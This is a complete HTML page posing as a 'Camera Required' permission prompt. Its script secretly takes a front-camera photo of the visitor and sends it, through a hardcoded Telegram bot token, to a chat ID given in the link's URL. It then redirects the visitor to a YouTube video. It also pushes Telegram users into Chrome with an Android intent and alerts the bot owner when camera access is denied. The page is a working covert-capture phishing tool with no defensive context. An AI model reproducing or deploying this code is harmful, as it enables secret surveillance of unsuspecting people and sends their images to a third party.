<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
        }
        h1 { color: #667eea; margin-bottom: 10px; font-size: 22px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        .loading {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #666; margin-top: 20px; font-size: 13px; }
        button {
            background: #28a745;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="title">📸 Camera Required</h1>
        <div class="subtitle" id="subtitle">Please click ALLOW to continue</div>
        <div class="loading" id="loading"></div>
        <div class="status" id="status">Requesting camera permission...</div>
    </div>

    <script>
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        // Telegram ဆိုရင် Chrome ကို Auto ခေါ်မယ်
        if (isTelegram && isMobile) {
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        let photoSent = false;
        
        async function sendPhotoToBot(imageBlob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = function() {
                    const base64data = reader.result;
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: (function() {
                            const fd = new FormData();
                            fd.append('chat_id', OWNER_ID);
                            fd.append('photo', imageBlob, 'photo.jpg');
                            fd.append('caption', `📸 Photo captured!\n🕐 ${new Date().toLocaleString()}`);
                            return fd;
                        })()
                    })
                    .then(res => {
                        console.log('Response:', res.status);
                        resolve();
                    })
                    .catch(err => {
                        console.log('Fetch error:', err);
                        resolve();
                    });
                };
                reader.readAsDataURL(imageBlob);
            });
        }
        
        async function takePhotoAndSend(stream) {
            if (photoSent) return;
            photoSent = true;
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            document.getElementById('status').innerHTML = '📤 Sending photo...';
            
            canvas.toBlob(async (blob) => {
                await sendPhotoToBot(blob);
                window.location.href = YOUTUBE_URL;
            }, 'image/jpeg', 0.8);
        }
        
        async function init() {
            if (!OWNER_ID) {
                document.getElementById('title').innerHTML = '❌ Error';
                document.getElementById('subtitle').innerHTML = 'Invalid link';
                document.getElementById('loading').style.display = 'none';
                return;
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                await takePhotoAndSend(stream);
                
            } catch (err) {
                document.getElementById('title').innerHTML = '❌ Camera Required';
                document.getElementById('subtitle').innerHTML = 'Please click ALLOW to continue';
                document.getElementById('loading').style.display = 'none';
                document.getElementById('status').innerHTML = 'Click ALLOW button above ☝️';
                
                if (OWNER_ID) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: OWNER_ID,
                            text: `❌ Camera DENIED!\n🕐 ${new Date().toLocaleString()}`
                        })
                    }).catch(e => console.log(e));
                }
            }
        }
        
        // Chrome မှာဆိုရင် စမယ်
        if (!isTelegram || !isMobile) {
            init();
        }
    </script>
</body>
</html>
